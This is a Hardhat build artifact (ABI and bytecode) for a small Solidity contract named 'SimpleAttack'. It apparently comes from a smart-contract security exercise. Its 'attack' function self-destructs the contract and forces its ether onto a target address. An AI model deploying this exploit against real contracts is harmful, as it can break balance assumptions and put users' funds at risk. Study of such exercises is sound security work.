{
  "_format": "hh-sol-artifact-1",
  "contractName": "SimpleAttack",
  "sourceName": "contracts/Simple-Attack.sol",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "target",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x6080604052610121806100136000396000f3fe608060405260043610601f5760003560e01c8063d018db3e14602a576025565b36602557005b600080fd5b348015603557600080fd5b50604c60048036038101906048919060c3565b604e565b005b8073ffffffffffffffffffffffffffffffffffffffff16ff5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000609582606c565b9050919050565b60a381608c565b811460ad57600080fd5b50565b60008135905060bd81609c565b92915050565b60006020828403121560d65760d56067565b5b600060e28482850160b0565b9150509291505056fea2646970667358221220ab9c90214a59e7e50a73a844ca4b33694381e844c696b26d1e1d107e3f195acd64736f6c63430008120033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}